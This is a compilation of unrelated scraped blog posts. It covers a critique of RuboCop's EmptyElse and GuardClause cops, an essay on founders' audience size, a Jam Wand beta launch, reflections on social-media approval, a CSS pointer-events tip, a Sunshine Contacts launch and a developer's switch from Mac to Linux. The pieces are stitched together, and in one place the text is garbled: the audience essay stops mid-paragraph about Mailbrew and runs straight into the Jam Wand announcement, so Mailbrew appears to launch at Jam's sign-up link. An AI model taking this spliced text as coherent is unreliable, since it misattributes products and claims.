November 19, 2020 | https://www.rubypigeon.com/posts/my-beef-with-rubocop/ | <a href="https://web.archive.org/web/*/https://www.rubypigeon.com/posts/my-beef-with-rubocop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Consider a hypothetical class that filters out unsafe HTML elements:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>else</span>
      <span>nil</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The default RuboCop settings would have us change it to this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>super</span> <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Let us feast on a three-course meal of opinion about why this is
worse.</p>



<p>My first beef — the hors d’oeuvre, if you will — is that
<code>Style/EmptyElse</code> wants us to change from an <em>explicit</em> <code>nil</code> return
value to an <em>implicit</em> one. It says there is a “redundant
else-clause”. I’ll tell you what’s redundant: the <code>Style/EmptyElse</code>
cop.</p>

<p>This cop would prefer that the <code>else</code> clause did not exist, like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>In terms of behaviour at runtime, this is exactly the same. In terms
of readability, it is not.</p>

<p>The explicit <code>nil</code> in the original implementation implies that the
method is being called for its return value — that it’s probably
functional, with inconsequential side effects.</p>

<p>Making the <code>nil</code> implicit says that <em>the return value is not
important</em>. This method now reads like it’s implemented by avoiding
side effects within <code>super</code>.</p>

<p>So which one is it? Is the filter supposed to work by returning <code>nil</code>,
or does it work by avoiding the side effects in the <code>super</code> call?
These are very different behaviours, and RuboCop just changed the
human interpretation from the correct one to the wrong one.</p>

<p>Bad cop. No doughnut.</p>



<p>My other beef (the main course) is with <code>Style/GuardClause</code>. This cop
takes conditionals and turns one of the branches into a guard clause
— something like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>return</span> <span>nil</span> <span>unless</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>

    <span>super</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Again, the runtime behaviour is identical, but the cop makes it less
readable.</p>

<p>Guard clauses are for bailing out early when you know that it’s not
necessary to run the rest of the method. They are usually trivial in
comparison to the <em>real</em> work done by the rest of the method. For
example, if we were implementing a sorting algorithm, then we could
have a guard clause for inputs with one element or less — there is
no need to run a sorting algorithm when there is nothing to sort.</p>

<p>Except in this case, we’re not “guarding” the rest of the method from
being run. That conditional is the <em>entire raison d’être of the
class</em>. It’s the most important part. The whole purpose of a filter is
to decide what elements stay in, and what elements get filtered out.</p>

<p>RuboCop has taken the most important part of the class and turned it
into a trivial-looking guard clause.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="branching-should-look-like-branching">Branching Should Look Like Branching</h2>

<p>My final qualm (is there such a thing as dessert beef?) is with
<code>Style/GuardClause</code> removing the obvious indenting of the two
branches, making it look like straight-line procedural code.</p>

<p>Most of the time, developers don’t so much <em>read</em> code as they do
<em>scan</em> code. We don’t read from left to right, top to bottom, as if
the codebase were the world’s most boring novel. We skim over code,
navigating by the colours of syntax highlighting and the shapes
made by indentation.</p>

<p>So when we’re skimming over the original code, trying to find the
conditional — which we’ve already established as being the most
important part of the class — we will find two landmarks: a line
that starts with a brightly coloured <code>if</code> keyword, and indentation
that suggests a conditional.</p>

<p>But skimming over the guard-clause-enhanced code we see neither of
these landmarks. Instead, we find indentation that suggests
<em>procedural</em> code: a series of statements that run from top to bottom.
RuboCop has taken an obvious conditional and reshaped it to look like
there is no conditional.</p>

<p>The <code>Style/GuardClause</code> cop is double bad, and misses out on two
doughnuts.</p>

<h2 id="disclaimerconclusion">Disclaimer/Conclusion</h2>

<p>I don’t dislike RuboCop. It’s well made, and a useful tool.</p>

<p>The problem starts when it is viewed not as a tool, but as a set of
divine commandments. Thou shalt not make implicit <code>nil</code>s explicit.
Thou shalt not write long-form conditionals. Thus saith the RuboCop.</p>

<p>This is not necessarily a problem with RuboCop itself — it’s a
problem with how people sometimes use RuboCop. One could argue that
the defaults aren’t great, but they are not a problem until someone
hooks them up to CI.</p>

<p>My only aim here is to disabuse readers of the notion that RuboCop can
only make code better. It’s a tool, and whether it helps or hurts
depends on how it’s used. Don’t be afraid to disable cops if you can’t
see how they benefit the team.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><p><span><p><em>In for the TLDR? Find the <a href="https://twitter.com/mxmzb/status/1329106639258087428">Twitter thread version here</a>.</em></p><p>A friend of mine is convinced that if you have a lot of followers on an arbitrary social media platform, you are in a much better spot to launch your product than without an audience. He points at people like Gary Vee, and Tai Lopez, implying that they are selling products purely on the back of their popularity. And although he has a point, I think this is extreme cherry-picking. In my opinion, it works for them for specific and unique reasons. </p><p>As I noticed, building an audience <strong>before having a product/service</strong> seems to be an evolving trend, even in the indie maker community. In my effort to find clearness, I've compiled a list of founders and influencers running businesses with differently sized audiences. I hope the examples will shed light on the correlation between large audiences and entrepreneurial success.</p><p>Before we start looking into this: You'll notice that when I write "audience", I <em>usually</em> refer to the Twitter following of a founder. That doesn't mean an audience can't be built on another platform, but it's what most tech founders associate with "audience". </p><p>Further, I will be referring to various sizes of audiences and grades of (routinely presumed) economic success. Those lines are blurry and defined by my intuition of what is what for the average indie maker.</p><h2>Large audience but little to no success</h2><p><em>A large audience in this context leans towards 50k and goes up infinitely. Little to no success means that the project/founder can not self-sustain or the project has died.</em></p><p>You have 50k followers on the platform of your choice. Will you be able to make your next startup successful with that many people behind your back?</p><p><a href="https://twitter.com/tjholowaychuk">TJ Holowaychuk</a> has 47k followers on Twitter (and 44k are occasionally seeing his contributions on GitHub). If you're a developer working with Node.js a lot, there is a good chance you've been using his code, or at least, code impacted by TJ.</p><p>TJ runs a software business called <a href="https://apex.sh/">Apex</a>, which offers monitoring/logging/uptime. I ran across it a few years ago and ever since haven't seen it build up a lot of momentum. Then, two months ago, I found <a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174?commentId=-MF0nsQqF-pLhijfLpgm">a comment by TJ on Indie Hackers</a>:</p><blockquote><p>Congrats! It's definitely tricky, even with my reasonably rare ~50k Twitter community it's still difficult, startups have it so easy in comparison.</p><p>-- <cite>TJ Holowaychuk</cite></p></blockquote><p>Maybe 50k is not enough. How about 2.6m? In May 2019, <a href="https://web.archive.org/web/20190528072150/https://www.instagram.com/arii/">Instagram influencer Arii</a> failed <a href="https://www.tyla.com/news/celebrity-instagram-influencer-with-26m-followers-struggles-to-sell-36-t-shirts-20190528">to sell 36 T-Shirts</a>. The story has been torn apart by media shortly after, with various theories on what had gone wrong. Fake followers, wrong audience, no marketing strategy, lousy product. I'm convinced it's everything except fake followers. Sure, she probably has many, but at 2.5m total, I am confident a few hundred thousand legitimate ones rule this out as the sole reason for failure.</p><p>Do you remember <a href="https://en.wikipedia.org/wiki/Beme">Beme</a>? The social app to <a href="https://www.youtube.com/watch?v=mixsze6uJPg">record videos when you hold it up to your chest</a>? This was an endeavor by Casey Neistat, who had <a href="https://web.archive.org/web/20150809013605/https://www.youtube.com/user/caseyneistat">~1m YouTube subscribers</a>, <a href="https://web.archive.org/web/20150705203923/https://twitter.com/CaseyNeistat">~135k followers on Twitter</a>, and <a href="https://web.archive.org/web/20150813225907/https://instagram.com/caseyneistat/">~400k on Instagram</a> back at the time. Despite accumulating millions of new fans of his own on all platforms ever since and CNN buying Beme in 2016, it eventually shut down in 2018.</p><p>Beme wasn't the only project by Casey that went down. There is also <a href="https://www.368.nyc/about">368</a>, a <em>"place where professional gamers, internet creators and cultural icons meet and create"</em>. Although it is open and operating, it's safe to say it's not what Casey had envisioned for it by far.</p><blockquote><p>[...]<!-- --> building a business is a really slow, really painful process <!-- -->[...]</p><p>-- <cite><a href="https://youtu.be/a49xvHviVds?t=123">Casey Neistat</a></cite></p></blockquote><p>Not convinced yet? Let's reduce the audience down to its purpose: Attention and somewhat targeted reach.</p><p>With this in mind, we can look at the products, which have been spun up and <a href="https://killedbygoogle.com/">eventually killed by yours truly, Google</a>.</p><p>Although Google isn't a person, I think it's a potent example that a social audience isn't tied to a projects' success. Google has millions of followers on all major social media platforms (don't expect me to link the accounts up).</p><p>For emphasis: This is a <a href="https://killedbygoogle.com/">collection of &gt; 200 diverse products</a> by big G itself, an <a href="https://www.theverge.com/2020/1/16/21069458/google-alphabet-trillion-dollar-market-cap-apple-microsoft">ex-1-trillion-net-worth</a> company that made 160 billion in revenue in 2019.</p><p>Each of those products has been likely in development for at least a year, with a dedicated and motivated group of brilliant people working on it. Furthermore, many of those products have been rolled out to Googles' existing audience by integrating them seamlessly into the user experience (Picasa, Google+, Google Reader, Google Video, etc.) or otherwise promoting them with the help of Googles' ecosystem and a bag of serious cash.</p><h2>Medium audience but immense success</h2><p><em>A medium audience in this context ranges from approximately 5-45k. Immense success means that the project is alive and healthy, and the founders can live far beyond their needs, with an ample surplus.</em></p><p>This is a selection of folks with a following that you wouldn't deem overwhelming but still have more to nurture their projects from than the average indie maker. To provide these particular examples significance, I made sure that they had a disproportionate amount of success. I also would like you to pay attention to how their followings became vast <em>after</em> (or should I say <em>while</em>?) building their businesses.</p><p>Probably you didn't expect someone like <a href="https://twitter.com/levelsio">Pieter Levels</a>, who now has an impressive following (currently ~92k on Twitter) and is popular in the industry of online entrepreneurship, to be in this category. However, if you look closely, <a href="https://www.crunchbase.com/organization/remote-ok">at the time Pieter launched RemoteOK</a> in 2015, he <a href="https://web.archive.org/web/20150129205450/https://twitter.com/levelsio">had about 9k followers</a>. I'm not saying that's irrelevant, but I am having trouble to justify <a href="https://remoteok.io/">RemoteOK's</a> success from solely that. <a href="https://www.crunchbase.com/organization/nomad-list">Pieter launched Nomad List</a>, the second startup he is known for, even earlier, in August 2014, when he barely had <a href="https://web.archive.org/web/20140813033726/https://twitter.com/levelsio">4k followers</a> on Twitter. That didn't hinder him to get significant press coverage early on by such as <a href="https://www.inc.com/jessica-stillman/the-best-cities-in-the-world-for-digital-nomads.html">Inc.com</a> or <a href="https://www.businessinsider.in/how-to-find-the-best-places-to-live-when-you-work-remotely/articleshow/39427000.cms">Business Insider India</a>.</p><p><a href="https://twitter.com/yongfook">Jon Yongfook</a> (~18k followers) not only has somewhat of a celebrity status in Singapore, but he also has a noteworthy <a href="https://www.instagram.com/yongfook/">Instagram following</a> (~14k followers). Jon created <a href="https://www.bannerbear.com/">Bannerbear</a> and <a href="https://www.bannerbear.com/open/">discloses his numbers openly</a>. Before Bannerbear, <a href="https://twitter.com/yongfook/status/1304212610204577792">he has "failed"</a> a lot of times, both with <a href="https://twitter.com/yongfook/status/1171311476222464001">zero revenue</a> projects and projects that had <a href="https://blog.yongfook.com/don-t-fail-because-your-marketing-sucks.html">millions raised and hundreds of employees</a>.</p><p><a href="https://twitter.com/shl">Sahil Lavignia</a>, who has accumulated even more followers than Pieter by now (~143k), <a href="https://sahillavingia.com/reflecting">can tell a bizarre story</a> about his company <a href="https://gumroad.com/">Gumroad</a>. He had <a href="https://web.archive.org/web/20120130074352/https://twitter.com/shl">~9k followers</a> when he got funded in the millions around 2011-2012. Although I have been on Twitter at that time I fail to remember how influential numbers like this were back then. In the darkest hours of Gumroad, around November 2015, Sahil had grown his audience to <a href="https://web.archive.org/web/20151129034039/https://twitter.com/shl">~17k followers</a>. Another three years later, in November 2018, he had <a href="https://web.archive.org/web/20180208231910/https://twitter.com/shl">~20k followers</a> when Gumroad slowly <a href="https://sahillavingia.com/reflecting">started to rehabilitate from its prior downturn</a>.</p><p>Nowadays, you can't browse Twitter even for a minute without seeing a Gumroad link popping up somewhere. But Sahil jumped from success to failure and back with each transition taking years and rather moderately growing his Twitter audience. I'd argue his Twitter presence never played a critical role in his business' following success: To this date, his followers presumably view him more as the daily source of wise life advice than as the CEO of Gumroad.</p><h2>Little to no audience but great success</h2><p><em>Little to no audience in this context is everything less than ~5k followers. Great success means that the project is alive and healthy, and the founders can at least sustain their life financially from the project alone. Note that I did not research how many followers the founders in this category had at launch time because they fell into the given range even at the time of writing. But, naturally, you can assume it was even less.</em></p><p>On the other side, there are those who have no large audience and succeeded at their business. These folks are laser-focusing on building their business, not on building an audience for their business.</p><p>Because it's easy to find successful products of founders who don't have a large audience (hint: Look for cool products, the founders are almost always small on social media), here are more examples:</p><p><a href="https://twitter.com/arichaprasad">Richa Prasad</a> (~40 followers) and <a href="https://twitter.com/lucygliang">Lucy Liang</a> (~450 followers) offer online weight loss coaching on <a href="https://www.coachviva.com/">Coach Viva</a> and have recently hit $10k monthly average. I love how they've managed to get a common idea to work <a href="https://www.indiehackers.com/interview/the-long-road-to-10k-in-30-days-414169d6b8">with smart, sequential marketing efforts</a>. For example, they started out with their personal network, made adjustments to the product itself based on feedback, cemented their authenticity with reviews, and eventually landed on <a href="https://www.youtube.com/channel/UCQjOVgcoZvC6-EK0xgankpQ">YouTube</a>.</p><p><a href="https://twitter.com/brettwill1025">Brett Williams</a> is virtually non-existent on social media but has had tremendous success building <a href="https://www.designjoy.co/">designjoy.co</a>), a productized service where he sells web design on a monthly subscription. With that, Brett is <a href="https://www.indiehackers.com/product/hue">reporting to make $26k MRR</a> and has recently crossed <a href="https://www.indiehackers.com/post/hit-400k-as-a-solo-founder-designjoy-update-35af18ab82">$400k in total revenue</a>. The project is about three years old at the time of writing.</p><p><a href="https://twitter.com/sarahhum">Sarah Hum</a> (~4k followers) and <a href="https://twitter.com/a13n">Andrew Rasmussen</a> (~1.5k followers) are the founders of <a href="https://canny.io/">Canny</a>, a crowd-feedback tool used by large brands and tools like <a href="https://ahrefs.canny.io/">ahrefs</a>, <a href="https://react-native.canny.io/feature-requests">React Native</a>, and even <a href="https://netflix.canny.io/">Netflix</a>. Although Canny has <a href="https://www.indiehackers.com/product/canny/1m-arr-milestone--MFew44ybD_39HOGO_N7">recently hit $1m ARR</a>, neither Sarah nor Andrew have an exceptional social media following. <a href="https://canny.io/blog/how-we-built-a-1m-arr-saas-startup/">They found success in strategies</a> like content marketing, cold outreach, and putting effort into a great launch on <a href="https://www.producthunt.com/posts/canny-3">Product Hunt</a>.</p><p><a href="https://twitter.com/linuz90">Fabrizio Rinaldi</a> (~4k followers) and <a href="https://twitter.com/frankdilo">Francesco Di Lorenzo</a> (~2,5k followers) are building <a href="https://mailbrew.com/">Mailbrew</a>, an all-in-one email digest for all your favorite news and updates in one place.

It just launched in beta today, and you can sign up at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/SXjlHrFlWNQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Jam Wand is the tool <a href="https://twitter.com/_irtefa">Irtefa</a> and I wished we had when we were product managers at Cloudflare. We used to spend too much engineering time changing copy. We felt bad asking engineers for yet another copy change, and engineers felt bad because checking out yet another copy-fixes branch is time consuming and boring. It was a lose-lose.</p><p>We wished changing copy on a website was as easy as changing copy in a Google Doc. That was the goal for building Jam Wand.</p><p>With Jam Wand, any non-technical member of the team - without dealing with code or git - can make copy changes to their live website. It opens up pull requests to the codebase, so all engineers have to do is review and merge, and the copy change is live. </p><p>We know it’s cheesy, but we used to be PMs, we love building products and our dream is to help product teams work better together and build better products, faster. </p><p>We think collaborative teams where everyone can contribute what they do best -- where customer support can update in-product help text, marketing can update landing page copy, dev rel can update developer docs, sales can update CTA text, and so on, leads to better products - which makes teams happy, users happy, it is a win-win.</p><h2 id="how-jam-wand-has-changed-our-workflow"><strong>How Jam Wand has changed our workflow</strong></h2><p>We built the Jam Wand website using Jam Wand (I know, you are very surprised). But it actually changed our workflow -- we didn’t have to have copy ready for engineering before they built the site. Instead, an engineer created the website scaffold with some placeholder text, and then deployed it, and once it was live, I could go in and write in the copy, right from the live website.</p><h2 id="a-new-way-to-build-and-maintain-documentation"><strong>A new way to build and maintain documentation</strong></h2><p>What we experienced at Cloudflare and what Jam users tell us, is that while all website copy is a challenge to update, developer documentation sites are a special challenge.</p><p>It’s too hard to suggest a fix to documentation (just explaining where the change should be in the docs site takes effort), and then to make the change, it has to be Jira-ed and scheduled into an engineering sprint. And so, many changes to docs that would improve the developer experience often aren’t made because there is too much overhead.</p><p>Jam transforms your developer documentation site into a collaborative workspace, like a Google Doc. And now, with Jam Wand, you can even change the copy right from the page, making it so that anyone can help improve your developer documentation. We’re excited for what that means for docs especially.</p><h2 id="can-t-wait-to-hear-what-you-think"><strong>Can’t wait to hear what you think</strong></h2><p>You can sign up for the beta at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><p>There’s a queue, but we want to prioritize bringing in people who care about collaboration and no-code workflows, who can help us shape the future of the product. You’ve read all the way to the end here, so it’s likely that’s you 😁 -- DM us <a href="https://twitter.com/scoopsofjam">@scoopsofjam</a> your waitlist # and we will try to bring you in early!</p><p>And lastly - Jam Wand was built by <a href="https://twitter.com/_cichocinski">Tomasz Cichociński</a>, and designed by <a href="http://gloriayanli.com/">Gloria Li</a>. Just wanted to give them a little shout here 🤩 &nbsp;go Tomasz and Gloria!<br></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Knowing who is in control</h2>
<p>There are too many writers that want to please their audience too much. </p>
<p>They try to come up with the topics that the reader would click on in the newsletter. They come up with words and sentences that put the writer in a good light. They do everything not to be judged and to be respected and envied.</p>
<p>This is a prevalent trend you see all around the internet. It applies to the small bloggers that have grown just a little bit, and also it applies to huge bloggers that have understood that real people are reading your writing on the other side.</p>
<p>This does not only apply to writing. It applies to public speaking, videos on topics, ADs campaigns and ever software.</p>
<h2>Software to please</h2>
<p>Most of the people when choosing what side project to build go through ups and downs and turns in their mind before starting to work. It is a gad damn rollercoaster.</p>
<p>One of the things the developer decides is, how will he be judged when he presents this product. Would he be congratulated and told how awesome this product is, or would he be booed and shamed for making such an app?</p>
<p>You might not realise, but that is the main factor that stops some amazingly bright folks from building things.</p>
<h2>Where it all started</h2>
<p>One of the indications of how successful you are right now is how many followers you have on each social network and how much engagement do your posts get.</p>
<p>That is a very slippery slope.</p>
<p>Do you that also base your social interactions subconsciously on this understand what are likes and how they are acquired?</p>
<p>You have users, and these users have interests. These interests are determining who they follow based on the content of the different profiles. This content is liked, shared and saved if it fills other peoples area of interest.</p>
<p>So what are trying to do when posting there? Trying to please others interest and boost their well being.</p>
<p>I think it is evident what this means to normal humans, right? It means that we get programmed that we need to please others to get social approval. We are becoming more and more, just like in the old tribe days. Get accepted with followers or likes, or die as an outcast doing something that no-one agrees and understands.</p>
<p><img alt="like vs you image heart" src="https://i.gyazo.com/fec32c0e74acb32eb7bca4b52a4c1e74.png"></p>
<h2>Going forward</h2>
<p>It is very interesting how will the world change with the outcomes coming from Covid, but one thing certain is that we got even more integrated with social networks. When you are scared of leaving your home, and by nature, we still require social interactions, you seek some enjoyment out from social networks. So guess what? You get even more addicted to it.</p>
<p>None of this is good or healthy. No way that people can switch off from the mentality they got while socially living in social networks every day, for most of the day.</p>
<p>One way that the world can change if more limits are put on to social networks in general. Once that is done, the social norm and acceptance of the hole social networks market can go down just a little bit. That should be enough to get early adopters onto other platforms that have no likes and other things that get you trapped in a vicious cycle.</p>
<p>Once those vocal adopters get in, it is only a matter of time until the world changes again. It has happened before, and there is no way for history to be different now.</p>
<p>My personal hope is that we all stop doing content and work for others and start doing it for ourselves. That will help us produce higher quality and very personal work. That way, humanity can grow, not degrade.</p>
<p>As always you can try right now, no-one is stopping you:</p>
<p>Start now. Get perfect later</p>

<p>To keep things streamlined with WordPress, I had to implement this hack the other day, where I wanted to disable tag links on just 1 page.</p>
<p>Instead of fiddling with a new plugin, I found it easier, in this case, to disable the link in the template engine with pure CSS.</p>
<p>The magic to remove the link feature lies in <code>pointer-events</code> while the rest ensures it doesn't look like one.</p>
<pre><code><span>a</span><span>.disabled</span> {
  <span>pointer-events</span>: none;      
  <span>text-decoration</span>: none;
  <span>cursor</span>: default;  
  <span>text-decoration</span>: none;
}
</code></pre>
<p>The semantics might be up for discussion, but the performance is possibly better than using Javascript.</p>
<p>This approach is available to all major browsers:  <a target="_blank" href="https://caniuse.com/pointer-events">CSS pointer-events (for HTML)</a> </p>

					<div><p>How do you make the mundane magical?&nbsp; Imagine if your contacts magically stayed up-to-date with no effort on your part.&nbsp; Or if the great photos you have of your friends got sent to them automatically. What if you never forgot another birthday?</p>

<p>The impossible is now possible. Smartphones have connected the world and put the entire internet into our pockets. We can get whatever we want delivered to our home whenever we want, sometimes by flying drone. With the rise of artificial intelligence, dreams of virtual assistants, self-driving cars and global facial recognition are no longer that far-fetched. However, despite transformational advances in technology, there are still tons of mundane, time-consuming tasks that we all do (or just don’t do) daily.<br><span><br><b>Sunshine’s technology will make the mundane effortless, free up your time, and make it easier to be thoughtful.</b></span></p>
<p><span>Every day, we muddle through tasks with technology that is “good enough” – contacting friends with stale information that may or may not reach them; searching through email for phone numbers and addresses that we know we have somewhere; manually and painstakingly creating group distribution lists for every occasion; scheduling time to get together with friends using a hodge-podge of calendar, email, and text; pinching and zooming through photos to find one with everyone’s eyes open. We’re used to the mess, and we’ve come to accept the friction.&nbsp;</span></p>

<p>No more.&nbsp; Everyday things should <b>just work</b>, and that’s Sunshine’s mission. We’re creating technology to address practical, everyday pain points in the basic, foundational tools that connect us with the people we care about. Ultimately, Sunshine will remove complexity in things like contact management, scheduling, event organization, and group communication so you can spend time more meaningfully.</p>

<p>We want to put the focus back on people, and let technology advance in its sophistication and fade into the background.</p>

<p>Today, we’re launching Sunshine Contacts (see our announcement here). Leveraging the power of artificial intelligence, Sunshine Contacts finds, deduplicates, and organizes your contacts. Using a variety of sources, we ensure your contact list is in one place, organized, always complete, and up-to-date.&nbsp; Sunshine Contacts makes your contacts <b>just work</b>.</p>

<p>Sunshine Contacts is our foundation. When your contacts are organized and truly work, they create a flywheel where scheduling, planning, organizing, and being thoughtful about your relationships becomes infinitely easier. When your contacts are complete, comprehensive, and accurately reflect relationships, you can spend your time building meaningful connections and shared experiences. Our future suite of products will make it effortless to keep in touch with the people in your life on a personal and professional level in a thoughtful way.</p>

<p>This is just the beginning.&nbsp; Sunshine is building a suite of services to solve the common pain points that modern technology hasn’t addressed.</p>

<p>At Sunshine, we strive to make the mundane magical. Our vision is to support your day-to-day life – to eliminate time spent on “technology” and simply make things better.&nbsp; Easier.&nbsp; If this means you save some “screen time” and give more thought to the most important people in your life, then we’ll know we’ve done it right.</p>

<p>We can’t wait to show you what’s next.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-18</small>
        <p>I’ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
<p>I got it primarily on recommendation from a friendly hacker who’s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>I’ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then I’ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in it’s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions I’ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developer’s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didn’t miss Linux at all. I’ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain I’ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that I’ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>That’s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. I’ve had some keys getting stuck but fixable with canned air. I don’t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I don’t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the “don’t charge it on the wrong side” problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As I’ve been using these devices it has become increasingly annoying to figure out how to install “unknown” apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. There’s always a new piece getting locked down. And while I think that’s often to the benefit of the average consumer, I’m not that. And I just get more annoyed.</p>
<p>I’ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I don’t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasn’t finalized. Woof, aside from running Windows as a dev environment which I didn’t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I can’t get a Ryzen, I can’t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesn’t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesn’t make any kind of sense for me and what I do. I can’t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I don’t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. I’m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I don’t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Don’t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So what’s next?</h2>
<p>With my office in the garage as my primary work location I’m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>I’m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But I’m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just don’t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasn’t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So I’ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>I’m not happy about it. I’ve generally enjoyed using my Macs. But when someone says “we’ll give you the full experience”, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, I’m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
